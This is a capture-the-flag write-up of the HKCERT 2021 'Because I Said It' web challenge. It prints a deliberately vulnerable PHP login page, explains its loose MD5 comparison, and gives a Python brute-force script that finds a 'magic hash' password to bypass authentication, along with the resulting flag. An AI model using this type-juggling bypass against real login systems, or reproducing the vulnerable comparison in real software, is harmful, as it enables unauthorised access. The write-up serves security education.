# Because I Said It (150 point, 76 solves, ★☆☆☆☆)

Solved by: Kaiziron and grhkm

### Description :
```
If you can solve Rickroll in 2020, you will be able to solve it. Probably.

本題所使用的 PHP 版本為 8.0.12。
The PHP version used for the challenge is 8.0.12.

http://chalf.hkcert21.pwnable.hk:28156/
```
---
### Solution :

The website has a login page :

![](https://i.imgur.com/MZguk93.png)

The `Check Here` link will show the source code of the page

```php
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

$username = $password = "";
$username_err = $password_err = $login_err = "";

if($_SERVER["REQUEST_METHOD"] == "POST"){

    if ((strlen($_POST["username"]) > 24) or strlen($_POST["password"]) > 24) {
        header("location: https://www.youtube.com/watch?v=2ocykBzWDiM");
        exit();
    }

    if(empty(trim($_POST["username"]))){
        $username_err = "Please enter username.";
    } else{
        $username = trim($_POST["username"]);
        if(empty(trim($_POST["password"]))){
            $password_err = "Please enter your password.";
        } else{
            $password = trim($_POST["password"]);
            if (!ctype_alnum(trim($_POST["password"])) or !ctype_alnum(trim($_POST["username"]))) {
                switch ( rand(0,2) ) {
                    case 0:
                    header("location: https://www.youtube.com/watch?v=l7pP3ydt3tU");
                    break;
                    case 1:
                    header("location: https://www.youtube.com/watch?v=G094II5gIsI");
                    break;
                    case 2:
                    header("location: https://www.youtube.com/watch?v=0YQtsez-_D4");
                    break;
                    default:
                    header("location: https://www.youtube.com/watch?v=2ocykBzWDiM");
                    exit();
                }   
            }
        }
    }    

    if ($username === 'hkcert') {
        if( hash('md5', $password) == 0 &&
            substr($password,0,strlen('hkcert')) === 'hkcert') {
            if (!exec('grep '.escapeshellarg($password).' ./used_pw.txt')) {

                $_SESSION["loggedin"] = true;
                $_SESSION["username"] = $username;

                $myfile = fopen("./used_pw.txt", "a") or die("Unable to open file!");
                fwrite($myfile, $password."\n");
                fclose($myfile);
                header("location: welcome.php");

            } else {
                $login_err = "Password has been used.";
            }

        } else {
            $login_err = "Invalid username or password.";
        }
    } else {
        $login_err = "Invalid username or password.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
    body{ font: 14px sans-serif; }
    .wrapper{ width: 360px; padding: 20px; }
</style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>

        <?php 
        if(!empty($login_err)){
            echo '<div class="alert alert-danger">' . $login_err . '</div>';
        }        
        ?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control <?php echo (!empty($username_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $username; ?>">
                <span class="invalid-feedback"><?php echo $username_err; ?></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control <?php echo (!empty($password_err)) ? 'is-invalid' : ''; ?>">
                <span class="invalid-feedback"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Want hints? <a href="source.php">Check Here</a>.</p>
        </form>
    </div>
</body>
</html>
```
There is a if statement to check the length of the username and the password :
```php
    if ((strlen($_POST["username"]) > 24) or strlen($_POST["password"]) > 24) {
        header("location: https://www.youtube.com/watch?v=2ocykBzWDiM");
        exit();
    }
```
The username and password can't be longer than 24 characters, otherwise it will redirect to youtube

```php
    if ($username === 'hkcert') {
        if( hash('md5', $password) == 0 &&
            substr($password,0,strlen('hkcert')) === 'hkcert') {
            if (!exec('grep '.escapeshellarg($password).' ./used_pw.txt')) {

                $_SESSION["loggedin"] = true;
                $_SESSION["username"] = $username;

                $myfile = fopen("./used_pw.txt", "a") or die("Unable to open file!");
                fwrite($myfile, $password."\n");
                fclose($myfile);
                header("location: welcome.php");

            } else {
                $login_err = "Password has been used.";
            }

        } else {
            $login_err = "Invalid username or password.";
        }
    } else {
        $login_err = "Invalid username or password.";
    }
```

This part of the code, will first check that the username need to be `hkcert`, however the second line used loose comparison which makes it vulnerable

Then the third line check if the password start with `hkcert`, if someone logged in successfully, the password will be saved on `used_pw.txt` and can't be used again

In php 8, if loose comparison `==` is used, strings start with 0e and if all characters after it are numbers, it will be equal to 0

Example :
```
echo 0e1234567890 == 0;
1
```

So we have to find a string that is start with `hkcert`, not longer than 24 characters, not used by anyone before and the md5 hash is start as 0e and all characters after it are numbers

So I used this script to find the needed hash :

```python
import sys
import hashlib

k = int(sys.argv[1])
while True:
    magic_hash = f"hkcertdsesucks{k}"
    md5_hash = hashlib.md5(magic_hash.encode()).hexdigest()
    if md5_hash[:2] == '0e' and md5_hash[2:].isnumeric():
        print(md5_hash)
        print(magic_hash)
    k += 1
```

After a while, a string with the md5 hash as `0e878814216701067617673816681096` is found

```
python3 magic_hash.py 7000000 
0e878814216701067617673816681096
hkcertdsesucks339691973
```

Then just use the username as `hkcert` and password as `hkcertdsesucks339691973`, we can bypass the login and get the flag

![](https://i.imgur.com/YrFJAk8.png)



### Flag :
`hkcert21{php_da_b3st_l4ng3ag3_3v3r_v3ry_4ws0m3}`

---